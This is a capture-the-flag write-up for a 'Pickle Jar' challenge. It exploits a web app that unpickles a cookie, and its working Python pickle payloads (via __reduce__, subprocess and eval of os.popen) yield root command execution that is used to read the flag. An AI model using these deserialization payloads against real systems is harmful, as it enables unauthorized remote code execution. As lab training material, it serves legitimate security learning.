---
Name: "Pickle Jar"
Category: "Security Summer School"
Difficulty: "Medium"
Description: "Abusing unsafe serialized data handling to complete the challenge."
---

# Pickle Jar
We find http://sss.upb:8007/jar and see that we have a pickles cookie with no value

Probably it's a hint that the website uses pickle to deserialize cookies

After changin its value we get this error, which confirms we are right
```
UnpicklingError

_pickle.UnpicklingError: invalid load key, '\xb5'.
```

Now lets try to run id
```python
import pickle
import subprocess
import base64

class RCE:
    def __reduce__(self):
        return (
            subprocess.check_output,
            (["id"],)
        )

payload = base64.b64encode(pickle.dumps(RCE())).decode()

print(payload)
```

But we are faced with TypeError: Object of type bytes is not JSON serializable. Lets make the payload a string

```python
import pickle
import base64
import builtins

class RCE:
    def __reduce__(self):
        return (
            builtins.eval,
            ("__import__('os').popen('id').read()",)
        )

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
```

After changing our cookie, it works and runs the command
```
"uid=0(root) gid=0(root) groups=0(root)\n"
```

Now we just have to find and read the flag

Find its path
```bash
find / -name flag.txt 2> /dev/null
"/home/ctf/flag.txt\n"
```

```bash
cat /home/ctf/flag.txt
"SSS{d0nt_3at_t00_m4ny_p1ckl3s}\n"
```

